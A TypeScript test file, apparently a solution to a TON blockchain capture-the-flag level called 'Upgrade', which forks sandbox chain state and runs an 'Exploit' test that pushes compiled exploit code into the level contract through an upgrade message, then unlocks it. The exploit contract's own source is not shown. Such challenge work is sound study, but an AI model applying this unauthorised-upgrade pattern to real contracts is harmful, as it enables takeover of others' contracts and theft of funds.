import {
    Blockchain,
    RemoteBlockchainStorage,
    SandboxContract,
    TreasuryContract,
    wrapTonClient4ForRemote,
} from '@ton/sandbox';
import { Address, beginCell, Cell, toNano } from '@ton/core';
import '@ton/test-utils';
import { compile } from '@ton/blueprint';
import { TonClient4 } from '@ton/ton';
import { Upgrade } from '../wrappers/wrappers/Upgrade';

// npx blueprint test 12. Upgrade.spec.ts
describe('Upgrade', () => {
    let level_code: Cell;
    let exploit_code: Cell;

    beforeAll(async () => {
        level_code = await compile('Upgrade');
        exploit_code = await compile('UpgradeExploit');
    });

    let blockchain: Blockchain;
    let deployer: SandboxContract<TreasuryContract>;
    let level: SandboxContract<Upgrade>;

    const level_addr = Address.parse('EQC4Cp89juHaV9ucgI5NjDep01if6IXl1X8urdQVsPBHtqOB');
    beforeEach(async () => {
        blockchain = await Blockchain.create({
            storage: new RemoteBlockchainStorage(
                wrapTonClient4ForRemote(
                    new TonClient4({
                        endpoint: 'https://sandbox-v4.tonhubapi.com',
                    }),
                ),
            ),
        });
        deployer = await blockchain.treasury('deployer');

        level = blockchain.openContract(Upgrade.createFromAddress(level_addr));
    });

    it('Exploit', async () => {
        console.log('Locked', await level.getLocked());

        await level.sendUpgrade(deployer.getSender(), toNano('0.3'), exploit_code);

        await level.sendUnlock(deployer.getSender(), toNano('0.3'));

        expect(await level.getLocked()).toEqual(false);
    });
});
